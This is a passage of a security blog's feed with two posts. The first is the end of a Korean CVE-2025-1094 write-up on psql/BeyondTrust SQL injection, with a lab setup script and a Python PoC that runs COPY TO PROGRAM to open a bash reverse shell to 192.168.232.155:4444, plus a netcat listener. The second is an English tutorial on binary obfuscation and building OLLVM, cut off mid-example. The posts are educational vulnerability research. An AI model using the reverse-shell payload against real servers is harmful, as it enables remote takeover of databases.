<strong>&#xC785;&#xB825;&#xAC12;&#xC758; &#xBD80;&#xC801;&#xC808;&#xD55C; &#xAC80;&#xC99D;</strong>&#xC73C;&#xB85C; &#xC778;&#xD574; &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC784;&#xC758;&#xC758; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xAC8C; &#xD558;&#xBA70;, &#xD2B9;&#xD788; BeyondTrust&#xC758; Privileged Remote Access (PRA)&#xC640; Remote Support (RS) &#xC18C;&#xD504;&#xD2B8;&#xC6E8;&#xC5B4;&#xC640; &#xC5F0;&#xACC4;&#xB418;&#xC5B4; &#xC6D0;&#xACA9; &#xCF54;&#xB4DC; &#xC2E4;&#xD589;(RCE) &#xACF5;&#xACA9;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>psql &#xB3C4;&#xAD6C;&#xC5D0;&#xC11C; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC2E4;&#xD589;&#xD558;&#xB294; &#xBD80;&#xBD84;&#xC5D0;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD588;&#xC2B5;&#xB2C8;&#xB2E4;. &#xD2B9;&#xD788;, &#xC774;&#xB97C; &#xD65C;&#xC6A9;&#xD55C;&#xB2E4;&#xBA74; &#xBA54;&#xD0C0; &#xBA85;&#xB839;&#xC5B4;(!)&#xC640; COPY TO PROGRAM &#xAE30;&#xB2A5;&#xC744; &#xC545;&#xC6A9;&#xD558;&#xC5EC; &#xC258; &#xBA85;&#xB839;&#xC744; &#xC2E4;&#xD589;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xD574;&#xB2F9; &#xCDE8;&#xC57D;&#xC810;&#xC740; PostgreSQL&#xC758; <code>psql</code> &#xB3C4;&#xAD6C;&#xAC00; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC740; UTF-8 &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC801;&#xC808;&#xD788; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xBABB;&#xD558;&#xB294; &#xAD6C;&#xC870;&#xC801; &#xACB0;&#xD568;&#xC5D0;&#xC11C; &#xBE44;&#xB86F;&#xB429;&#xB2C8;&#xB2E4;. BeyondTrust&#xC758; <code>thin-scc-wrapper</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C;&#xB294; <code>gskey</code> &#xAC12;&#xC744; echo &#xBA85;&#xB839;&#xC5B4;&#xB97C; &#xD1B5;&#xD574; <code>dbquote</code> &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0; &#xC804;&#xB2EC;&#xD558;&#xB294;&#xB370;, &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; &#xACF5;&#xACA9;&#xC790;&#xAC00; UTF-8&#xB85C; &#xC704;&#xC7A5;&#xD55C; &#xC545;&#xC758;&#xC801; &#xBC14;&#xC774;&#xD2B8;(<code>0xC0 0x27</code>)&#xB97C; &#xC0BD;&#xC785;&#xD558;&#xBA74; <code>pg_escape_string()</code> &#xD568;&#xC218;&#xB85C;&#xB3C4; &#xC548;&#xC804;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; SQL &#xCFFC;&#xB9AC; &#xB0B4;&#xC5D0; &#xC8FC;&#xC785;&#xC774; &#xAC00;&#xB2A5;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB85C; &#xC778;&#xD574; psql&#xC5D0;&#xC11C; SQL &#xCFFC;&#xB9AC; &#xC2E4;&#xD589;&#xC774; &#xC911;&#xB2E8;&#xB418;&#xBA70;, &#xB4A4;&#xC774;&#xC5B4; &#xB098;&#xC624;&#xB294; &#xBA54;&#xD0C0; &#xBA85;&#xB839;&#xC5B4;(&#xC608;: <code>\!</code>)&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xC5B4; SQL Injection&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;.</p><p>&#xB610;&#xD55C;, <code>echo $gskey</code> &#xB300;&#xC2E0; <code>echo &quot;$gskey&quot;</code>&#xC640; &#xAC19;&#xC774; &#xC778;&#xC790;&#xB97C; &#xC548;&#xC804;&#xD558;&#xAC8C; &#xCC98;&#xB9AC;&#xD558;&#xC9C0; &#xC54A;&#xACE0; &#xC778;&#xC790; &#xC778;&#xC81D;&#xC158;&#xC744; &#xD5C8;&#xC6A9;&#xD55C; CVE-2024-12356 &#xCDE8;&#xC57D;&#xC810;&#xACFC; &#xACB0;&#xD569;&#xB420; &#xACBD;&#xC6B0;, WebSocket &#xD504;&#xB85C;&#xD1A0;&#xCF5C;&#xC744; &#xD1B5;&#xD55C; &#xC6D0;&#xACA9; &#xBE44;&#xC778;&#xC99D; RCE&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB2E8;&#xB3C5;&#xC73C;&#xB85C;&#xB3C4; psql&#xC758; &#xC798;&#xBABB;&#xB41C; UTF-8 &#xCC98;&#xB9AC;&#xB9CC;&#xC73C;&#xB85C; RCE&#xAC00; &#xAC00;&#xB2A5;&#xD558;&#xB2E4;&#xB294; &#xC810;&#xC5D0;&#xC11C; <strong>&#xC911;&#xB300;&#xD55C; &#xC124;&#xACC4;&#xC0C1;&#xC758; &#xACB0;&#xD568;</strong>&#xC785;&#xB2C8;&#xB2E4;.</p><p>&#xCDE8;&#xC57D;&#xD55C; &#xCF54;&#xB4DC; &#xC608;&#xC2DC;:</p><pre><code class="hljs c"><span class="hljs-keyword">if</span> (valid_utf8_check(input) == <span class="hljs-literal">false</span>) {    execute_sql(input);}</code></pre><p>&#xC774;&#xB7EC;&#xD55C; &#xAD6C;&#xD604;&#xC740; &#xC0AC;&#xC6A9;&#xC790; &#xC785;&#xB825;&#xC744; &#xC801;&#xC808;&#xD788; &#xAC80;&#xC99D;&#xD558;&#xC9C0; &#xC54A;&#xC544; SQL &#xC778;&#xC81D;&#xC158;&#xC744; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD569;&#xB2C8;&#xB2E4;.</p><h3 id="PoC"><a href="#PoC" class="headerlink" title="PoC"></a>PoC</h3><h3 id="1-&#xCDE8;&#xC57D;&#xD55C;-PostgreSQL-14-15-&#xD658;&#xACBD;-&#xC124;&#xC815;"><a href="#1-&#xCDE8;&#xC57D;&#xD55C;-PostgreSQL-14-15-&#xD658;&#xACBD;-&#xC124;&#xC815;" class="headerlink" title="1. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15 &#xD658;&#xACBD; &#xC124;&#xC815;"></a>1. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15 &#xD658;&#xACBD; &#xC124;&#xC815;</h3><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL 14.15 &#xB3C4;&#xCEE4; &#xC774;&#xBBF8;&#xC9C0; &#xB2E4;&#xC6B4;&#xB85C;&#xB4DC; &#xC911;...&quot;</span>sudo docker pull postgres:14.15<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL 14.15 &#xCEE8;&#xD14C;&#xC774;&#xB108; &#xBC30;&#xD3EC; &#xC911;...&quot;</span>sudo docker run --name vulnerable_postgres \-e POSTGRES_USER=postgres \-e POSTGRES_PASSWORD=postgres \-e POSTGRES_DB=testdb \-p 5432:5432 \-d postgres:14.15<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] PostgreSQL &#xCD08;&#xAE30;&#xD654; &#xB300;&#xAE30; &#xC911;...&quot;</span>sleep 10<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[+] &#xCDE8;&#xC57D;&#xD55C; &#xD14C;&#xC774;&#xBE14; &#xC0DD;&#xC131; &#xC911;...&quot;</span>sudo docker <span class="hljs-built_in">exec</span> -i vulnerable_postgres psql -U postgres -d testdb &lt;&lt;EOFCREATE TABLE users (id SERIAL PRIMARY KEY, username TEXT, password TEXT);INSERT INTO users (username, password) VALUES (<span class="hljs-string">&apos;admin&apos;</span>, <span class="hljs-string">&apos;password123&apos;</span>);EOF<span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;[&#x2713;] &#xC124;&#xC815; &#xC644;&#xB8CC;. &#xCDE8;&#xC57D;&#xD55C; PostgreSQL 14.15&#xAC00; &#xC2E4;&#xD589; &#xC911;&#xC785;&#xB2C8;&#xB2E4;!&quot;</span></code></pre><p>&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; <code>setup.sh</code>&#xB85C; &#xC800;&#xC7A5;&#xD55C; &#xD6C4; &#xC2E4;&#xD589; &#xAD8C;&#xD55C;&#xC744; &#xBD80;&#xC5EC;&#xD558;&#xACE0; &#xC2E4;&#xD589;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">chmod +x setup.shsudo ./setup.sh</code></pre><h3 id="2-Exploit"><a href="#2-Exploit" class="headerlink" title="2. Exploit"></a>2. Exploit</h3><pre><code class="hljs python"><span class="hljs-keyword">import</span> psycopg2<span class="hljs-comment"># PostgreSQL &#xC5F0;&#xACB0; &#xC815;&#xBCF4;</span>HOST = <span class="hljs-string">&quot;127.0.0.1&quot;</span>PORT = <span class="hljs-string">&quot;5432&quot;</span>DATABASE = <span class="hljs-string">&quot;testdb&quot;</span>USER = <span class="hljs-string">&quot;postgres&quot;</span>PASSWORD = <span class="hljs-string">&quot;postgres&quot;</span><span class="hljs-comment"># RCE&#xB97C; &#xC704;&#xD55C; &#xC545;&#xC758;&#xC801;&#xC778; SQL &#xC778;&#xC81D;&#xC158; &#xD398;&#xC774;&#xB85C;&#xB4DC;</span>payload = <span class="hljs-string">&quot;COPY users TO PROGRAM &apos;bash -c \&quot;bash -i &gt;&amp; /dev/tcp/192.168.232.155/4444 0&gt;&amp;1\&quot;&apos;;&quot;</span><span class="hljs-keyword">try</span>:    conn = psycopg2.connect(host=HOST, port=PORT, dbname=DATABASE, user=USER, password=PASSWORD)    cursor = conn.cursor()    print(<span class="hljs-string">&quot;[+] PostgreSQL&#xC5D0; &#xC5F0;&#xACB0;&#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;!&quot;</span>)    cursor.execute(payload)    print(<span class="hljs-string">&quot;[&#x2713;] RCE &#xC2E4;&#xD589; &#xC644;&#xB8CC;! Netcat &#xB9AC;&#xC2A4;&#xB108;&#xB97C; &#xD655;&#xC778;&#xD558;&#xC138;&#xC694;.&quot;</span>)<span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:    print(<span class="hljs-string">&quot;[-] &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787; &#xC2E4;&#xD328;:&quot;</span>, str(e))<span class="hljs-keyword">finally</span>:    <span class="hljs-keyword">if</span> conn:        cursor.close()        conn.close()</code></pre><p>Netcat &#xB9AC;&#xC2A4;&#xB108;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC258; &#xC5F0;&#xACB0;&#xC744; &#xC218;&#xC2E0;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">nc -lvnp 4444</code></pre><p>&#xC774;&#xD6C4; PoC &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xC5EC; &#xC6D0;&#xACA9; &#xC258;&#xC744; &#xD68D;&#xB4DD;&#xD569;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs bash">python3 poc.py</code></pre><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ul><li><a href="https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html">https://thehackernews.com/2025/02/postgresql-vulnerability-exploited.html</a></li></ul>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/1day1line/">1day1line</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/clalxk/">clalxk</category>
      
      <category domain="https://hackyboiz.github.io/tags/PostgreSQL/">PostgreSQL</category>
      
      <category domain="https://hackyboiz.github.io/tags/BeyondTrust/">BeyondTrust</category>
      
      <category domain="https://hackyboiz.github.io/tags/SQL-Injection/">SQL Injection</category>
      
      <category domain="https://hackyboiz.github.io/tags/Remote-Code-Execution/">Remote Code Execution</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2025-1094/">CVE-2025-1094</category>
      
      <category domain="https://hackyboiz.github.io/tags/CVE-2024-12356/">CVE-2024-12356</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/30/clalxk/CVE-2025-1094/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Anti-Debugging Part 3(EN)</title>
      <link>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/28/OUYA77/Anti_part3/en/</guid>
      <pubDate>Mon, 28 Apr 2025 13:15:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Hello, this is OUYA77! &amp;#x1F642;&lt;/p&gt;
&lt;p&gt;Last time, I mentioned that I might cover obfuscation on the blog if the opportunity came up &amp;#x2</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Hello, this is OUYA77! &#x1F642;</p><p>Last time, I mentioned that I might cover obfuscation on the blog if the opportunity came up &#x2014; and well, here we are with Part 3!</p><p>In Part 1, we explored debugging and anti-debugging techniques. Then in Part 2, we looked at ways to <strong>bypass anti-debugging</strong>, which acts like a &#x201C;trap card&#x201D; trying to block certain actions.</p><p>(If you haven&#x2019;t checked them out yet, here&#x2019;s a quick link &#x1F447; haha </p><blockquote><p>Check out the previous parts:</p><p><a href="https://hackyboiz.github.io/2024/12/29/OUYA77/Anti_part1/en/">[Research] Anti-Debugging Part 1 (EN)</a></p><p><a href="https://hackyboiz.github.io/2025/03/24/OUYA77/Anti_part2/en/">[Research] Anti-Debugging Part 2 (EN)</a></p></blockquote><p>Since this series has been a bit of long journey, it&#x2019;s totally understandable if some details have slipped your mind.</p><p>Just in case, I even prepared a little cartoon (!) to sum things up. <del>I swear there was no my hope while making it. It&#x2019;s also a <em>total secret</em> that I had to call in an expert for help with the framing because it turned out way harder than I thought&#x2026;</del></p><h2 id="Anti-Debugging-Part-Summary"><a href="#Anti-Debugging-Part-Summary" class="headerlink" title="Anti-Debugging Part Summary"></a>Anti-Debugging Part Summary</h2><p><img src="image%201.png" alt="image.png"></p><p><img src="image%202.png" alt="image.png"></p><p><img src="image%203.png" alt="image.png"></p><p>As you saw in the cartoon, anti-debugging techniques were developed to block debugging &#x2014; and bypassing techniques were invented to counter them. Through Part 1 and Part 2, we saw that anti-debugging has its limits: ultimately, a program must be loaded into memory to run, and the final binary must be delivered to the user. This means that if a user analyzes the binary and understands the anti-debugging logic, they can patch it or find ways around it.</p><p>That&#x2019;s when the legendary Chef Gordon Ramsay shows up and yells,</p><p><strong>&#x201C;You need to <em>hide</em> these ingredients (anti-debugging logic) better!&#x201D;</strong> &#x1F525;&#x1F468;&#x200D;&#x1F373;</p><p>&#x2014; And thus, <strong>obfuscation</strong> must be applied.</p><blockquote><p>In Part 2&#x2026;</p><p><img src="image%204.png" alt="image.png"></p><blockquote><p>???: So why not just hide it? / 000: How!!</p></blockquote></blockquote><p>When anti-debugging is combined with <strong>obfuscation</strong>, it becomes extremely difficult to identify which parts of a program contain anti-debugging logic, making the analysis process even more challenging. That&#x2019;s why in <strong>Part 3</strong>, we will take a deep dive into this fascinating technique called <strong>obfuscation</strong>!</p><h2 id="1-Obfuscation"><a href="#1-Obfuscation" class="headerlink" title="1. Obfuscation"></a>1. Obfuscation</h2><h3 id="1-1-Introduction"><a href="#1-1-Introduction" class="headerlink" title="1.1 Introduction"></a>1.1 Introduction</h3><ul><li><strong>Obfuscation</strong> is a technique that intentionally makes a program&#x2019;s code difficult to read.<br>Wikipedia defines it as:</li></ul><blockquote><p>&#x201C;In software development, obfuscation is the practice of creating source or machine code that is intentionally difficult for humans or computers to understand.&#x201D;</p></blockquote><p>Obfuscation goes beyond simply making code less readable &#x2014; it is used to <strong>hinder reverse engineering, debugging, and static analysis</strong>, and serves various purposes such as intellectual property protection, security enhancement, and evading malware analysis.</p><h3 id="1-2-Purpose"><a href="#1-2-Purpose" class="headerlink" title="1.2 Purpose"></a>1.2 Purpose</h3><p>Obfuscation achieves the following defensive goals without changing the actual behavior of a program:</p><ul><li><strong>Reduced readability</strong>: Hides the logical structure and meaning of the code to obstruct understanding.</li><li><strong>Increased structural complexity</strong>: Introduces unnecessary operations, nonlinear flows, random-based conditions, etc.</li><li><strong>Evasion of pattern detection</strong>: Tricks signature-based detection tools or causes false positives/negatives.</li></ul><p>In short, if an analyst looks at the program and thinks,</p><p><em>&#x201C;Ugh&#x2026; this is going to be a headache ;;&#x201D;</em></p><p>&#x2014; then the obfuscation has already succeeded to some degree.</p><h3 id="1-3-Types-of-Obfuscation"><a href="#1-3-Types-of-Obfuscation" class="headerlink" title="1.3 Types of Obfuscation"></a>1.3 Types of Obfuscation</h3><p>Obfuscation can largely be divided into two categories:</p><ol><li><strong>Source Code Obfuscation</strong></li></ol><ul><li><strong>Target</strong>: High-level source code (Java, JavaScript, Python, etc.)</li><li><strong>Applied at</strong>: Before compilation</li><li><strong>Purpose</strong>: To secure internal code and protect flow when partially disclosing code to outsourcing partners or clients</li></ul><p>Source code obfuscation is often used when a company needs to provide part of its code to third parties, ensuring that the overall structure or algorithms are not easily understood. Common techniques include <strong>renaming identifiers</strong>, <strong>rearranging code blocks</strong>, <strong>control flow obfuscation</strong>, and <strong>string encoding</strong>.</p><ol><li><strong>Binary Obfuscation</strong></li></ol><ul><li><strong>Target</strong>: Compiled executables (C, C++, Go, etc.)</li><li><strong>Applied at</strong>: During or after compilation</li><li><strong>Purpose</strong>: Product protection, algorithm safeguarding, crack/reverse engineering prevention</li></ul><p>Binary obfuscation is <strong>crucial for protecting actual distributed products.</strong> Since most commercial software is distributed in binary form &#x2014; containing valuable algorithms, licensing logic, and authentication mechanisms &#x2014; protecting it is essential. Otherwise, attackers or even customers could reverse engineer or crack the software.</p><blockquote><p>Technically, malware is also a kind of &#x201C;product&#x201D;&#x2026; and yes, binary obfuscation is heavily used in malware as well.</p></blockquote><p>Binary obfuscation aims to disrupt static analysis tools like IDA and Ghidra, confuse debugging attempts, and in some cases, ensure that the code is only decrypted during execution. Common techniques include <strong>control flow flattening</strong>, <strong>string encryption</strong>, <strong>inserting junk code</strong>, <strong>name mangling</strong>, and <strong>indirect jumps/calls</strong>.</p><h3 id="1-4-Focus-on-Binary-Obfuscation"><a href="#1-4-Focus-on-Binary-Obfuscation" class="headerlink" title="1.4 Focus on Binary Obfuscation"></a>1.4 Focus on Binary Obfuscation</h3><p>In this part, we will especially focus on binary obfuscation. Why is it so important? Simple: Because most of the programs we use are ultimately delivered as binaries, containing the company&#x2019;s key know-how, algorithms, licensing mechanisms, and more. Without proper protection, it can lead not just to technical attacks like cracking and reverse engineering, but also serious business damage like illegal redistribution and intellectual property theft. That&#x2019;s why we need anti-reversing techniques &#x2014; and that&#x2019;s what we have been exploring since Part 1.</p><p>If anti-debugging mainly disrupts dynamic analysis (trying to observe the program at runtime),<br>then obfuscation focuses on obstructing static analysis (analyzing the code without running it).<br>When both techniques are combined, the analyst is essentially facing a near-invincible defense system.</p><p><img src="image.png" alt="image.png"></p><blockquote><p><del>(Though, even an &#x201C;invincible shield&#x201D; can meet an &#x201C;unstoppable spear&#x201D; someday&#x2026;)</del></p></blockquote><h2 id="2-The-Three-Pillars-of-Binary-Obfuscation"><a href="#2-The-Three-Pillars-of-Binary-Obfuscation" class="headerlink" title="2. The Three Pillars of Binary Obfuscation"></a>2. The Three Pillars of Binary Obfuscation</h2><p>Binary obfuscation is generally classified into the following three categories.</p><p>(<em>Some parts will be covered briefly.</em>)</p><h3 id="2-1-Structural-Obfuscation"><a href="#2-1-Structural-Obfuscation" class="headerlink" title="2.1 Structural Obfuscation"></a>2.1 Structural Obfuscation</h3><blockquote><p>Obfuscation that twists the structure of the code&#x2019;s control flow itself, making analysis much harder.</p></blockquote><p>This category mainly targets <strong>static analysis tools</strong> that attempt to understand the program at the function or block level, making it difficult to grasp the overall structure.</p><ul><li><p><strong>Control Flow Flattening</strong></p><p>  <img src="image%205.png" alt="ref. https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/"></p><p>  ref. <a href="https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/">https://gosecure.github.io/presentations/2020-05-15-advanced-binary-analysis/</a></p><ul><li>Originally, logical flows like <code>if</code>, <code>while</code>, and <code>switch</code> are flattened into a single <code>dispatcher</code> loop. The next block to execute is determined based on a <strong>state variable</strong>.<ul><li>As a result, the control flow is obfuscated into a non-intuitive form, neutralizing the control flow tree analysis of static tools.</li><li>We&#x2019;ll take a closer look at this later with an example from Obfuscator-LLVM (OLLVM)!</li></ul></li></ul></li><li><strong>Junk / Dead Code Insertion</strong><ul><li>Inserts meaningless operations (Junk Code) or never-executed code (Dead Code) into the program.</li><li>Typical examples:<ul><li>No-op operations (<code>x = x;</code>, <code>add eax, 0;</code>)</li><li>Unreachable branches (<code>if (false) { ... }</code>)</li></ul></li></ul></li><li><strong>Indirect Branching / Calling</strong><ul><li>Jumps or calls are made through calculated addresses (e.g., <code>jmp eax</code>, <code>call [ecx+0x10]</code>).</li><li>This makes tracing the code flow extremely difficult (especially for API resolution).</li></ul></li><li><strong>Opaque Predicate</strong><ul><li>Branches are inserted with conditions that are always true/false (e.g., <code>if ((x*x) &gt;= 0)</code>).</li><li>Harmless at runtime but significantly obstruct static flow analysis.</li></ul></li><li><strong>Important Note:</strong><ul><li>Compiler optimization options like <code>O2</code>, <code>O3</code> may eliminate meaningless code during build.</li><li>Therefore, it&#x2019;s critical to <strong>disable optimization options</strong> or <strong>use runtime-dependent variables</strong> to prevent removal during obfuscation.</li></ul></li><li><strong>Effect:</strong><ul><li>Analysts are forced to wade through unnecessary loops and branches, leading to psychological exhaustion. As shown below, inserting just a few dummy codes can make the control flow graph dramatically more complex.</li></ul></li></ul><p><img src="image%206.png" alt="image.png"></p><p>&#x1F50D; <em>Structural obfuscation mainly aims to neutralize CFG (Control Flow Graph) analysis and flow tracking.</em></p><h3 id="2-2-Data-Obfuscation"><a href="#2-2-Data-Obfuscation" class="headerlink" title="2.2 Data Obfuscation"></a>2.2 Data Obfuscation</h3><blockquote><p>Obfuscation that hides or alters data to make it difficult to infer its meaning.</p></blockquote><p>This category focuses on removing or hiding <strong>valuable clues</strong> such as strings, constants, and API names.</p><ul><li><strong>String Encryption</strong><ul><li>Critical strings are encrypted and only decrypted at runtime.</li><li>Static analysis won&#x2019;t reveal strings like <code>&quot;CreateProcess&quot;</code> anymore.</li></ul></li><li><strong>Constant Encoding</strong><ul><li>Constant values are represented indirectly (e.g., <code>1337</code> &#x2192; <code>1000 + 337</code>).</li><li>This complicates understanding the program&#x2019;s purpose and logic during decompilation.</li></ul></li><li><strong>API Call Obfuscation/ Import Hiding</strong><ul><li>API names are hidden using hashing or encryption, loaded dynamically via <code>LoadLibrary</code> and <code>GetProcAddress</code>.</li><li>Completely neutralizes IAT-based automatic analysis.</li></ul></li></ul><p>&#x1F50D; <em>Data obfuscation prevents analysts and tools from extracting meaningful information (identifiers, strings, APIs).</em></p><h3 id="2-3-Algorithm-Obfuscation"><a href="#2-3-Algorithm-Obfuscation" class="headerlink" title="2.3 Algorithm Obfuscation"></a>2.3 Algorithm Obfuscation</h3><blockquote><p>Obfuscation that makes the actual functionality and logic of the program harder to understand.</p></blockquote><p>This category twists the <strong>behavior itself</strong>, making it difficult to understand &#x201C;what&#x201D; the program actually does, even after disassembling it.</p><ul><li><p><strong>Name Mangling &amp; Symbol Stripping</strong></p><ul><li>Debugging symbols are removed, and function/variable names are replaced with random strings.</li><li>This makes understanding the overall logic and functionality much harder.</li><li><p>Below is an example from <em>Hack The Drone 2024 (Final)</em> where LFSR Galois algorithm was used for packet encoding.</p><p><img src="image%207.png" alt="image.png"></p></li><li><p>As shown, original function and parameter names reveal a lot about the algorithm.</p><p><img src="image%208.png" alt="image.png"></p></li><li><p>However, with name mangling applied, it becomes much harder to quickly figure out what the algorithm does.</p><ul><li><em>(Although nowadays, tools like GPT can deduce the logic pretty quickly&#x2026;)</em> &#x1F605;</li></ul></li></ul></li><li><strong>Self-Modifying Code</strong><ul><li>The program modifies its own code during execution.</li><li>This makes static analysis practically impossible.</li></ul></li><li><strong>Virtualization Obfuscation</strong><ul><li>A custom virtual ISA (instruction set architecture) is created, and the original code is transformed into bytecode.</li><li>Without reverse-engineering the VM interpreter, understanding the logic is nearly impossible.</li></ul></li></ul><p>&#x1F50D; <em>Algorithm obfuscation makes it extremely difficult to understand <strong>what the program actually does</strong>.</em></p><h2 id="3-Hands-on-with-Obfuscator-LLVM"><a href="#3-Hands-on-with-Obfuscator-LLVM" class="headerlink" title="3. Hands-on with Obfuscator-LLVM"></a>3. Hands-on with Obfuscator-LLVM</h2><p><strong>OLLVM (Obfuscator-LLVM)</strong> is an obfuscation-enhanced version of the open-source compiler framework <strong>LLVM</strong>. While LLVM was originally designed to generate &#x201C;clean&#x201D; and optimized code, researchers noticed how flexible its architecture was &#x2014; and decided to extend it by adding <strong>heavy-duty code obfuscation</strong> capabilities. That&#x2019;s how OLLVM was born.</p><p>OLLVM automatically transforms code during the <strong>compilation process</strong>, by inserting dedicated <strong>obfuscation passes</strong>. Thanks to this, developers don&#x2019;t need to manually modify their source code &#x2014; they just need to compile it differently to produce heavily obfuscated binaries.</p><h3 id="3-1-How-to-Build-Clang-for-OLLVM"><a href="#3-1-How-to-Build-Clang-for-OLLVM" class="headerlink" title="3.1 How to Build Clang for OLLVM"></a>3.1 How to Build Clang for OLLVM</h3><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Installation">https://github.com/obfuscator-llvm/obfuscator/wiki/Installation</a></p><pre><code class="hljs bash">$ git <span class="hljs-built_in">clone</span> -b llvm-4.0 https://github.com/obfuscator-llvm/obfuscator.git$ mkdir build &amp;&amp; <span class="hljs-built_in">cd</span> build$ cmake -DCMAKE_BUILD_TYPE=Release ../obfuscator/$ make -j7</code></pre><p>In my case, I encountered a few errors during the build process, so I had to patch the source code manually. If you run into similar issues, check your build logs and troubleshoot accordingly.</p><p>Here are the fixes I made:</p><p><strong>In</strong> <code>obfuscator/tools/clang/lib/CodeGen/CGOpenMPRuntime.cpp</code> <strong>(lines 6275, 6321, 6400):</strong></p><p><code>error:lambda parameter &#x2018;CGF&#x2019; previously declared as a capture</code> </p><p>&#x2192; Simply remove the redundant <code>&amp;CFG</code> capture.</p><pre><code class="hljs c"><span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, &amp;CGF, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)&#x2193;<span class="hljs-keyword">auto</span> &amp;&amp;BeginThenGen = [&amp;D, Device, &amp;Info, &amp;CodeGen, &amp;NoPrivAction](...)</code></pre><ul><li><strong>In</strong> <code>obfuscator/include/llvm/ExecutionEngine/Orc/OrcRemoteTargetClient.h</code> <strong>(line 696):</strong></li></ul><p><code>error: cannot convert</code></p><p>&#x2192; Change the return type from <code>char</code> to <code>uint8_t</code>.</p><pre><code class="hljs c"><span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">char</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }&#x2193;<span class="hljs-function">Expected&lt;<span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;<span class="hljs-keyword">uint8_t</span>&gt;&gt; <span class="hljs-title">readMem</span><span class="hljs-params">(...)</span> </span>{ ... }</code></pre><p><img src="image%209.png" alt="image.png"></p><p>If everything goes well, you should see the custom OLLVM-enabled <code>clang</code> binary built successfully!</p><h3 id="3-2-How-to-Use-OLLVM"><a href="#3-2-How-to-Use-OLLVM" class="headerlink" title="3.2 How to Use OLLVM"></a>3.2 How to Use OLLVM</h3><p>The easiest way to use Obfuscator-LLVM is to pass specific flags to the LLVM backend via Clang using the <code>-mllvm</code> option.</p><p>The main available flags are:</p><p><a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Features">https://github.com/obfuscator-llvm/obfuscator/wiki/Features</a></p><ul><li><code>fla</code>: Control Flow Flattening</li><li><code>sub</code>: Instruction Substitution</li><li><code>bcf</code>: Bogus Control Flow</li></ul><p>If you want to apply obfuscation selectively to specific functions, you can also use <a href="https://github.com/obfuscator-llvm/obfuscator/wiki/Functions-annotations">function annotations</a>.</p><h3 id="3-3-Practice"><a href="#3-3-Practice" class="headerlink" title="3.3 Practice"></a>3.3 Practice</h3><p>Let&#x2019;s start with a simple program:</p><pre><code class="hljs c"><span class="hljs-comment">// flatten_example.c</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;stdio.h&gt;</span></span><span class="hljs-function"><span class="hljs-keyword">int</span> <span class="hljs-title">secret_function</span><span class="hljs-params">(<span class="hljs-keyword">int</span> x)</span> </span>{    <span class="hljs-keyword">if</span> (x &gt; <span class="hljs-number">0</span>) {        <span class="hljs-keyword">return</span> x * 